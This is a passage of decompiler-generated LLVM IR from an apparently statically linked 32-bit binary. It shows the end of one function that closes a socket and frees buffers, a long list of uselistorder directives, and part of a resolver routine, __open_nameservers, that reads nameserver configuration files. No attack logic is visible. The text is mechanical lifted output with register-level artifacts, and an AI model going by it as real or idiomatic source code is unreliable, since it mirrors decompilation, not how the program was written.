  store i32 %v0_80654bd, i32* %eax.global-to-local, align 4
  %v1_80654c2 = inttoptr i32 %v0_80654bd to i32*
  store i32 -1, i32* %v1_80654c2, align 4
  %v0_80654c8 = load i32, i32* @esp, align 4
  %v1_80654c8 = add i32 %v0_80654c8, 44
  %v2_80654c8 = inttoptr i32 %v1_80654c8 to i32*
  %v3_80654c8 = load i32, i32* %v2_80654c8, align 4
  store i32 %v3_80654c8, i32* %eax.global-to-local, align 4
  %v2_80654cc = add i32 %v0_80654c8, 56
  %v3_80654cc = inttoptr i32 %v2_80654cc to i32*
  store i32 %v3_80654c8, i32* %v3_80654cc, align 4
  br label %dec_label_pc_80654d0

dec_label_pc_80654d0:                             ; preds = %dec_label_pc_8065235, %dec_label_pc_806520d, %dec_label_pc_80654bd
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_80654bd ], [ %v0_8064ebf, %dec_label_pc_8065235 ], [ %v0_8064ebf, %dec_label_pc_806520d ]
  %v0_80654d0 = load i32, i32* @esp, align 4
  %v1_80654d0 = add i32 %v0_80654d0, 20
  %v2_80654d0 = inttoptr i32 %v1_80654d0 to i32*
  %v3_80654d0 = load i32, i32* %v2_80654d0, align 4
  %v13_80654d0 = icmp eq i32 %v3_80654d0, -1
  br i1 %v13_80654d0, label %dec_label_pc_80654d0.dec_label_pc_80654e6_crit_edge, label %dec_label_pc_80654d7

dec_label_pc_80654d0.dec_label_pc_80654e6_crit_edge: ; preds = %dec_label_pc_80654d0
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_80654e6

dec_label_pc_80654d7:                             ; preds = %dec_label_pc_80654d0
  %v3_80654da = load i32, i32* %v2_80654d0, align 4
  %v5_80654da = add i32 %v0_80654d0, -16
  %v6_80654da = inttoptr i32 %v5_80654da to i32*
  store i32 %v3_80654da, i32* %v6_80654da, align 4
  %v1_80654de = sext i16 %stack_var_-192.1 to i32
  %v2_80654de = call i32 @__libc_close(i32 %v1_80654de)
  store i32 %v2_80654de, i32* %eax.global-to-local, align 4
  %v0_80654e3 = load i32, i32* @esp, align 4
  %v1_80654e3 = add i32 %v0_80654e3, 16
  br label %dec_label_pc_80654e6

dec_label_pc_80654e6:                             ; preds = %dec_label_pc_80654d0.dec_label_pc_80654e6_crit_edge, %dec_label_pc_80654d7
  %v1_80654ed.pre-phi = phi i32 [ %.pre, %dec_label_pc_80654d0.dec_label_pc_80654e6_crit_edge ], [ %v1_80654de, %dec_label_pc_80654d7 ]
  %v0_80654e6 = phi i32 [ %v0_80654d0, %dec_label_pc_80654d0.dec_label_pc_80654e6_crit_edge ], [ %v1_80654e3, %dec_label_pc_80654d7 ]
  %v1_80654e9 = add i32 %v0_80654e6, 12
  %v2_80654e9 = inttoptr i32 %v1_80654e9 to i32*
  %v3_80654e9 = load i32, i32* %v2_80654e9, align 4
  %v5_80654e9 = add i32 %v0_80654e6, -16
  %v6_80654e9 = inttoptr i32 %v5_80654e9 to i32*
  store i32 %v3_80654e9, i32* %v6_80654e9, align 4
  %v2_80654ed = call i32 @free(i32 %v1_80654ed.pre-phi)
  store i32 %v2_80654ed, i32* %eax.global-to-local, align 4
  %v1_80654f2 = load i32, i32* @esp, align 4
  %v2_80654f2 = inttoptr i32 %v1_80654f2 to i32*
  store i32 %v2_8064e2a, i32* %v2_80654f2, align 4
  %v2_80654f5 = call i32 @free(i32 %v1_80654ed.pre-phi)
  store i32 %v2_80654f5, i32* %eax.global-to-local, align 4
  %v0_80654fa = load i32, i32* @esp, align 4
  %v1_80654fd = add i32 %v0_80654fa, 32
  %v2_80654fd = inttoptr i32 %v1_80654fd to i32*
  store i32 -1, i32* %v2_80654fd, align 4
  %v0_8065505 = load i32, i32* @esp, align 4
  %v1_8065505 = add i32 %v0_8065505, 40
  %v2_8065505 = inttoptr i32 %v1_8065505 to i32*
  %v3_8065505 = load i32, i32* %v2_8065505, align 4
  %v13_8065505 = icmp eq i32 %v3_8065505, -1
  br i1 %v13_8065505, label %dec_label_pc_8065559, label %dec_label_pc_806550c

dec_label_pc_806550c:                             ; preds = %dec_label_pc_80654e6
  %v0_806550c = load i32, i32* @ecx, align 4
  %v2_806550c = add i32 %v0_8065505, -4
  %v3_806550c = inttoptr i32 %v2_806550c to i32*
  store i32 %v0_806550c, i32* %v3_806550c, align 4
  %v1_806550d = add i32 %v0_8065505, -8
  %v2_806550d = inttoptr i32 %v1_806550d to i32*
  store i32 ptrtoint (i8** @global_var_807ca1c.880 to i32), i32* %v2_806550d, align 4
  %v1_8065512 = add i32 %v0_8065505, -12
  %v2_8065512 = inttoptr i32 %v1_8065512 to i32*
  store i32 134583465, i32* %v2_8065512, align 4
  %v1_8065517 = add i32 %v0_8065505, 184
  store i32 %v1_8065517, i32* @ebx, align 4
  %v2_806551e = add i32 %v0_8065505, -16
  %v3_806551e = inttoptr i32 %v2_806551e to i32*
  store i32 %v1_8065517, i32* %v3_806551e, align 4
  %v4_806551f = inttoptr i32 %v1_80654ed.pre-phi to i32*
  %v5_806551f = call i32 @__pthread_cleanup_push_defer(i32* %v4_806551f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_806551f, i32* %eax.global-to-local, align 4
  %v0_8065524 = load i32, i32* @esp, align 4
  %v1_8065524 = inttoptr i32 %v0_8065524 to i32*
  store i32 ptrtoint (i8** @global_var_807ca1c.880 to i32), i32* %v1_8065524, align 4
  %v2_806552b = call i32 @pthread_mutex_lock(i32 %v1_80654ed.pre-phi)
  store i32 %v2_806552b, i32* %eax.global-to-local, align 4
  %v0_8065530 = load i32, i32* @esp, align 4
  %v1_8065530 = add i32 %v0_8065530, 56
  %v2_8065530 = inttoptr i32 %v1_8065530 to i32*
  %v3_8065530 = load i32, i32* %v2_8065530, align 4
  store i32 %v3_8065530, i32* %edx.global-to-local, align 4
  %v1_8065534 = add i32 %v0_8065530, 72
  %v2_8065534 = inttoptr i32 %v1_8065534 to i32*
  %v3_8065534 = load i32, i32* %v2_8065534, align 4
  store i32 %v3_8065534, i32* %eax.global-to-local, align 4
  %v1_8065538 = sext i32 %v3_8065530 to i64
  store i64 %v1_8065538, i64* @global_var_807ca34.881, align 8
  %v1_806553e = trunc i32 %v3_8065534 to i16
  store i16 %v1_806553e, i16* @global_var_8074008.882, align 8
  %v1_8065544 = inttoptr i32 %v0_8065530 to i32*
  %v2_8065544 = load i32, i32* %v1_8065544, align 4
  store i32 %v2_8065544, i32* %eax.global-to-local, align 4
  %v3_8065544 = add i32 %v0_8065530, 4
  %v1_8065545 = inttoptr i32 %v3_8065544 to i32*
  %v2_8065545 = load i32, i32* %v1_8065545, align 4
  store i32 %v2_8065545, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8065545, align 4
  %v0_8065548 = load i32, i32* @ebx, align 4
  store i32 %v0_8065548, i32* %v1_8065544, align 4
  %v4_8065549 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_806551f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065549, i32* %eax.global-to-local, align 4
  %v0_806554e = load i32, i32* @esp, align 4
  %v1_806554e = add i32 %v0_806554e, 32
  %v2_806554e = inttoptr i32 %v1_806554e to i32*
  store i32 -1, i32* %v2_806554e, align 4
  br label %dec_label_pc_8065556

dec_label_pc_8065556:                             ; preds = %dec_label_pc_80653ca, %dec_label_pc_806550c
  %v0_8065556 = load i32, i32* @esp, align 4
  %v1_8065556 = add i32 %v0_8065556, 16
  br label %dec_label_pc_8065559

dec_label_pc_8065559:                             ; preds = %dec_label_pc_80654e6, %dec_label_pc_8065556
  %v0_8065559 = phi i32 [ %v0_8065505, %dec_label_pc_80654e6 ], [ %v1_8065556, %dec_label_pc_8065556 ]
  %v1_8065559 = add i32 %v0_8065559, 16
  %v2_8065559 = inttoptr i32 %v1_8065559 to i32*
  %v3_8065559 = load i32, i32* %v2_8065559, align 4
  store i32 %v3_8065559, i32* %eax.global-to-local, align 4
  %v1_806555d = add i32 %v0_8065559, 220
  %v1_8065563 = inttoptr i32 %v1_806555d to i32*
  %v2_8065563 = load i32, i32* %v1_8065563, align 4
  store i32 %v2_8065563, i32* @ebx, align 4
  %v3_8065563 = add i32 %v0_8065559, 224
  %v1_8065564 = inttoptr i32 %v3_8065563 to i32*
  %v2_8065564 = load i32, i32* %v1_8065564, align 4
  store i32 %v2_8065564, i32* @esi, align 4
  %v3_8065564 = add i32 %v0_8065559, 228
  %v1_8065565 = inttoptr i32 %v3_8065564 to i32*
  %v2_8065565 = load i32, i32* %v1_8065565, align 4
  store i32 %v2_8065565, i32* @edi, align 4
  %v3_8065565 = add i32 %v0_8065559, 232
  %v1_8065566 = inttoptr i32 %v3_8065565 to i32*
  %v2_8065566 = load i32, i32* %v1_8065566, align 4
  store i32 %v2_8065566, i32* @ebp, align 4
  ret i32 %v3_8065559

; uselistorder directives
  uselistorder i32 %v0_8065559, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8065530, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8065505, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_80654e6, { 1, 0 }
  uselistorder i32 %v1_80654ed.pre-phi, { 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8065498.pre, { 1, 0 }
  uselistorder i32 %v5_806546b, { 1, 0 }
  uselistorder i32 %v3_806546b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8065433, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_80653fc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80653ca, { 1, 0 }
  uselistorder i32 %v3_80653a9, { 1, 0, 2 }
  uselistorder i32 %v0_806539a, { 1, 0 }
  uselistorder i32 %v5_8065390, { 1, 0 }
  uselistorder i32* %v3_8065390, { 1, 0 }
  uselistorder i32 %v0_806526685, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8065390, { 2, 1, 0 }
  uselistorder i32 %v5_806538a, { 1, 0 }
  uselistorder i32 %v1_8065389, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8065385, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8065349, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8065323, { 1, 0 }
  uselistorder i32 %v1_8065314, { 1, 0 }
  uselistorder i32 %v0_80652d3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_806527a, { 1, 2, 0 }
  uselistorder i32 %v0_806527a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8065254, { 1, 0 }
  uselistorder i32 %v1_806524e, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8065249, { 1, 2, 0 }
  uselistorder i32 %v5_806525462, { 1, 0 }
  uselistorder i32 %v5_80651f6, { 1, 0 }
  uselistorder i32 %v3_80651f6, { 2, 0, 1, 3 }
  uselistorder i32 %v3_80651ae, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8065194, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8065194, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8065173, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8065153, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80650f9, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80650de, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80650c7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_806504f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_806503c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8065002, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8064fe3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8064fc7, { 1, 0 }
  uselistorder i32 %v3_8064fbc, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8064fb9, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8064f5e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8064f59, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8064f42, { 1, 0 }
  uselistorder i32 %v1_8064f0e, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8064eff99, { 2, 1, 0 }
  uselistorder i32 %v3_8064f17, { 1, 0, 4, 3, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i16 %v0_8064ebf, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8064eb8, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 13 }
  uselistorder i32 %v2_8064e2a, { 7, 4, 11, 3, 6, 8, 9, 10, 0, 1, 2, 5, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 94, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 52, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 81, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 148, { 0, 13, 11, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 43, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 100, { 3, 17, 6, 9, 12, 4, 10, 11, 5, 7, 13, 0, 1, 2, 14, 15, 16, 8 }
  uselistorder i32 68, { 6, 0, 3, 8, 9, 1, 7, 4, 5, 2, 10 }
  uselistorder i8 1, { 62, 1, 49, 63, 69, 2, 60, 3, 68, 64, 50, 65, 51, 4, 5, 6, 7, 8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 52, 53, 45, 54, 55, 66, 67, 10, 0, 46, 47, 14, 15, 16, 17, 56, 57, 58, 11, 59, 12, 61, 13, 48 }
  uselistorder i32 27, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32 67, { 0, 2, 1 }
  uselistorder i32 112, { 0, 5, 6, 7, 3, 4, 1, 2 }
  uselistorder i32 88, { 0, 10, 11, 12, 13, 19, 4, 5, 6, 7, 8, 9, 1, 16, 17, 3, 18, 2, 14, 15 }
  uselistorder i32 72, { 10, 11, 12, 9, 7, 8, 5, 13, 4, 3, 2, 6, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 (%pollfd*, i32, i32)* @__libc_poll, { 3, 0, 1, 2 }
  uselistorder i32 10000, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 232, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 228, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 176, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @inet_addr, { 1, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 7, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 4, 10, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 2, 3, 1, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1, 3, 7, 5, 4, 6 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32* inttoptr (i32 -1 to i32*), { 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder i32 200, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 11, 0, 1, 2, 3, 4, 5, 12, 13, 6, 7, 8, 9, 10 }
  uselistorder i32 104, { 3, 0, 4, 2, 1 }
  uselistorder i32 116, { 3, 5, 0, 1, 6, 4, 2 }
  uselistorder i32 84, { 12, 0, 13, 1, 14, 15, 4, 9, 10, 5, 6, 7, 8, 11, 2, 3 }
  uselistorder i8* inttoptr (i32 -1 to i8*), { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9 }
  uselistorder i32 -12, { 29, 23, 22, 24, 21, 25, 26, 27, 28, 30, 31, 32, 33, 34, 20, 36, 37, 35, 38, 39, 40, 41, 42, 3, 4, 43, 44, 142, 139, 140, 48, 45, 46, 47, 49, 50, 9, 138, 7, 8, 5, 6, 51, 10, 11, 52, 0, 141, 58, 59, 53, 54, 55, 56, 57, 60, 61, 12, 62, 143, 70, 69, 14, 64, 15, 65, 66, 67, 68, 63, 13, 71, 72, 75, 74, 76, 77, 78, 79, 73, 80, 81, 82, 83, 91, 92, 93, 94, 95, 96, 90, 89, 88, 85, 86, 87, 84, 97, 98, 99, 100, 101, 102, 103, 104, 1, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 16, 121, 120, 17, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 18, 132, 19, 133, 134, 2, 135, 136, 137 }
  uselistorder i16* @global_var_8074008.882, { 2, 1, 0 }
  uselistorder i64* @global_var_807ca34.881, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_807ca1c.880 to i32), { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1025, { 4, 5, 6, 1, 2, 0, 3 }
  uselistorder i32 512, { 13, 3, 14, 15, 7, 8, 0, 1, 2, 4, 5, 6, 9, 10, 11, 12 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8065559, { 1, 0 }
  uselistorder label %dec_label_pc_8065556, { 1, 0 }
  uselistorder label %dec_label_pc_80654e6, { 1, 0 }
  uselistorder label %dec_label_pc_80654d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80654bd, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8065498.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8065490, { 1, 0 }
  uselistorder label %dec_label_pc_8065477, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_806542c, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80653ca, { 1, 0 }
  uselistorder label %dec_label_pc_806539a, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8065390, { 1, 0 }
  uselistorder label %dec_label_pc_8065385, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065382, { 1, 0 }
  uselistorder label %dec_label_pc_80652fd, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8065245, { 1, 0 }
  uselistorder label %dec_label_pc_80650c7, { 1, 0 }
  uselistorder label %dec_label_pc_8065090, { 1, 0 }
  uselistorder label %dec_label_pc_8065002, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064f0e, { 1, 0 }
  uselistorder label %dec_label_pc_8064ef8, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8065568 = load i32, i32* @ebp, align 4
  %v0_8065569 = load i32, i32* @edi, align 4
  %v0_806556a = load i32, i32* @esi, align 4
  %v0_806556b = load i32, i32* @ebx, align 4
  store i32 %v0_806556b, i32* %stack_var_-16, align 4
  store i32 134583465, i32* %stack_var_-216, align 4
  %v3_8065577 = ptrtoint i32* %stack_var_-216 to i32
  %v4_8065584 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  %v1_8065590 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  store i32 %v1_8065590, i32* @eax, align 4
  %v0_8065598 = load i32, i32* @global_var_807e560.762, align 32
  %tmp41 = icmp slt i32 %v0_8065598, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_806578f, label %dec_label_pc_80655a5

dec_label_pc_80655a5:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_806e751.873 to i32), i32* %stack_var_-216, align 4
  %v2_80655b1 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_806e71f.885 to i32), i32 ptrtoint (i32* @global_var_806e751.873 to i32))
  store i32 %v2_80655b1, i32* @eax, align 4
  store i32 %v2_80655b1, i32* @ebp, align 4
  %v1_80655bb = icmp eq i32 %v2_80655b1, 0
  %v1_80655bd = icmp eq i1 %v1_80655bb, false
  br i1 %v1_80655bd, label %dec_label_pc_806575a.preheader, label %dec_label_pc_80655c3

dec_label_pc_80655c3:                             ; preds = %dec_label_pc_80655a5
  store i32 ptrtoint (i32* @global_var_806e751.873 to i32), i32* %stack_var_-216, align 4
  %v2_80655cf = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_806e730.886 to i32), i32 ptrtoint (i32* @global_var_806e751.873 to i32))
  store i32 %v2_80655cf, i32* @ebp, align 4
  %v1_80655d9 = icmp eq i32 %v2_80655cf, 0
  %v1_80655db = icmp eq i1 %v1_80655d9, false
  br i1 %v1_80655db, label %dec_label_pc_806575a.preheader, label %dec_label_pc_8065784

dec_label_pc_806575a.preheader:                   ; preds = %dec_label_pc_80655a5, %dec_label_pc_80655c3
  %v2_8065761 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8065695 = add i32 %v3_8065577, 164
  %v3_806567f = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_806575a

dec_label_pc_80655e6:                             ; preds = %dec_label_pc_80655f1
  %v1_80655e6 = add i32 %v0_80655e655, 1
  store i32 %v1_80655e6, i32* @ebx, align 4
  %v1_80655e7 = inttoptr i32 %v1_80655e6 to i8*
  %v2_80655e7 = load i8, i8* %v1_80655e7, align 1
  %v3_80655e7 = zext i8 %v2_80655e7 to i32
  %v5_80655e7 = and i32 %v6_80655e758, -256
  %v6_80655e7 = or i32 %v3_80655e7, %v5_80655e7
  store i32 %v6_80655e7, i32* @ecx, align 4
  %v4_80655e9 = icmp eq i8 %v2_80655e7, 0
  br i1 %v4_80655e9, label %dec_label_pc_806575a, label %dec_label_pc_80655f1

dec_label_pc_80655f1:                             ; preds = %dec_label_pc_80655f1.lr.ph, %dec_label_pc_80655e6
  %v6_80655e758 = phi i32 [ %v6_80655e753, %dec_label_pc_80655f1.lr.ph ], [ %v6_80655e7, %dec_label_pc_80655e6 ]
  %v2_80655e757 = phi i8 [ %v2_80655e750, %dec_label_pc_80655f1.lr.ph ], [ %v2_80655e7, %dec_label_pc_80655e6 ]
  %v1_80655e756 = phi i8* [ %v1_80655e749, %dec_label_pc_80655f1.lr.ph ], [ %v1_80655e7, %dec_label_pc_80655e6 ]
  %v0_80655e655 = phi i32 [ %v0_80655e7.pre, %dec_label_pc_80655f1.lr.ph ], [ %v1_80655e6, %dec_label_pc_80655e6 ]
  %v2_80655f1 = sext i8 %v2_80655e757 to i32
  store i32 %v2_80655f1, i32* @edx, align 4
  store i32 %v0_80655f4.pre, i32* @eax, align 4
  %v2_80655f9 = mul nsw i32 %v2_80655f1, 2
  %v3_80655f9 = add i32 %v0_80655f4.pre, %v2_80655f9
  %v4_80655f9 = inttoptr i32 %v3_80655f9 to i8*
  %v5_80655f9 = load i8, i8* %v4_80655f9, align 1
  %v6_80655f9 = and i8 %v5_80655f9, 32
  %v7_80655f9 = icmp eq i8 %v6_80655f9, 0
  %v1_80655fd = icmp eq i1 %v7_80655f9, false
  br i1 %v1_80655fd, label %dec_label_pc_80655e6, label %dec_label_pc_80655ff

dec_label_pc_80655ff:                             ; preds = %dec_label_pc_80655f1
  %v10_80655ff = icmp eq i8 %v2_80655e757, 10
  br i1 %v10_80655ff, label %dec_label_pc_806575a, label %dec_label_pc_8065608

dec_label_pc_8065608:                             ; preds = %dec_label_pc_80655ff
  %v10_8065610 = icmp eq i8 %v2_80655e757, 35
  %v1_8065613 = icmp eq i1 %v10_8065610, false
  br i1 %v1_8065613, label %dec_label_pc_8065664.preheader, label %dec_label_pc_806575a

dec_label_pc_8065664.preheader:                   ; preds = %dec_label_pc_8065608
  %v2_80656644 = load i8, i8* %v1_80655e756, align 1
  %v3_80656645 = icmp eq i8 %v2_80656644, 0
  br i1 %v3_80656645, label %dec_label_pc_8065670, label %dec_label_pc_8065669

dec_label_pc_806561a:                             ; preds = %dec_label_pc_8065669
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_806561e = load i32, i32* @esp, align 4
  %v3_806561e = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_806561e = add nuw nsw i32 %v3_806561e, 152
  %v5_806561e = add i32 %v4_806561e, %v1_806561e
  %v6_806561e = inttoptr i32 %v5_806561e to i32*
  store i32 %v0_806561e, i32* %v6_806561e, align 4
  %v0_8065628.pre = load i32, i32* @ebx, align 4
  %v4_8065628.pre = load i32, i32* @ecx, align 4
  %v1_806562859 = inttoptr i32 %v0_8065628.pre to i8*
  %v2_806562860 = load i8, i8* %v1_806562859, align 1
  %v3_806562861 = zext i8 %v2_806562860 to i32
  %v5_806562862 = and i32 %v4_8065628.pre, -256
  %v6_806562863 = or i32 %v3_806562861, %v5_806562862
  %v4_806562a64 = icmp eq i8 %v2_806562860, 0
  br i1 %v4_806562a64, label %dec_label_pc_8065647.preheader, label %dec_label_pc_806562e.lr.ph

dec_label_pc_806562e.lr.ph:                       ; preds = %dec_label_pc_806561a
  %v0_8065631.pre = load i32, i32* @global_var_8073fcc, align 4
  br label %dec_label_pc_806562e

dec_label_pc_8065627:                             ; preds = %dec_label_pc_806563c
  %v1_8065627 = add i32 %v0_806562765, 1
  store i32 %v1_8065627, i32* @ebx, align 4
  %v1_8065628 = inttoptr i32 %v1_8065627 to i8*
  %v2_8065628 = load i8, i8* %v1_8065628, align 1
  %v3_8065628 = zext i8 %v2_8065628 to i32
  %v5_8065628 = and i32 %v6_806562867, -256
  %v6_8065628 = or i32 %v3_8065628, %v5_8065628
  %v4_806562a = icmp eq i8 %v2_8065628, 0
  br i1 %v4_806562a, label %dec_label_pc_8065647.preheader, label %dec_label_pc_806562e

dec_label_pc_806562e:                             ; preds = %dec_label_pc_806562e.lr.ph, %dec_label_pc_8065627
  %v6_806562867 = phi i32 [ %v6_806562863, %dec_label_pc_806562e.lr.ph ], [ %v6_8065628, %dec_label_pc_8065627 ]
  %v2_806562866 = phi i8 [ %v2_806562860, %dec_label_pc_806562e.lr.ph ], [ %v2_8065628, %dec_label_pc_8065627 ]
  %v0_806562765 = phi i32 [ %v0_8065628.pre, %dec_label_pc_806562e.lr.ph ], [ %v1_8065627, %dec_label_pc_8065627 ]
  %v2_806562e = sext i8 %v2_806562866 to i32
  store i32 %v2_806562e, i32* @edx, align 4
  store i32 %v0_8065631.pre, i32* @eax, align 4
  %v2_8065636 = mul nsw i32 %v2_806562e, 2
  %v3_8065636 = add i32 %v0_8065631.pre, %v2_8065636
  %v4_8065636 = inttoptr i32 %v3_8065636 to i8*
  %v5_8065636 = load i8, i8* %v4_8065636, align 1
  %v6_8065636 = and i8 %v5_8065636, 32
  %v7_8065636 = icmp eq i8 %v6_8065636, 0
  %v1_806563a = icmp eq i1 %v7_8065636, false
  br i1 %v1_806563a, label %dec_label_pc_8065647.preheader, label %dec_label_pc_806563c

dec_label_pc_806563c:                             ; preds = %dec_label_pc_806562e
  %v10_806563c = icmp eq i8 %v2_806562866, 10
  %v1_806563f = icmp eq i1 %v10_806563c, false
  br i1 %v1_806563f, label %dec_label_pc_8065627, label %dec_label_pc_8065647.preheader

dec_label_pc_8065647.preheader:                   ; preds = %dec_label_pc_806563c, %dec_label_pc_806562e, %dec_label_pc_8065627, %dec_label_pc_806561a
  %v0_8065627.lcssa = phi i32 [ %v0_8065628.pre, %dec_label_pc_806561a ], [ %v1_8065627, %dec_label_pc_8065627 ], [ %v0_806562765, %dec_label_pc_806562e ], [ %v0_806562765, %dec_label_pc_806563c ]
  %v6_8065628.lcssa = phi i32 [ %v6_806562863, %dec_label_pc_806561a ], [ %v6_8065628, %dec_label_pc_8065627 ], [ %v6_806562867, %dec_label_pc_806562e ], [ %v6_806562867, %dec_label_pc_806563c ]
  %v1_806564773 = inttoptr i32 %v0_8065627.lcssa to i8*
  %v2_806564774 = load i8, i8* %v1_806564773, align 1
  %v3_806564775 = zext i8 %v2_806564774 to i32
  %v5_806564776 = and i32 %v6_8065628.lcssa, -256
  %v6_806564777 = or i32 %v3_806564775, %v5_806564776
  store i32 %v6_806564777, i32* @ecx, align 4
  %v4_806564978 = icmp eq i8 %v2_806564774, 0
  br i1 %v4_806564978, label %dec_label_pc_8065660, label %dec_label_pc_806564d

dec_label_pc_8065643:                             ; preds = %dec_label_pc_806565b, %dec_label_pc_806564d
  store i8 0, i8* %v1_806564780, align 1
  %v0_8065646 = load i32, i32* @ebx, align 4
  %v1_8065646 = add i32 %v0_8065646, 1
  store i32 %v1_8065646, i32* @ebx, align 4
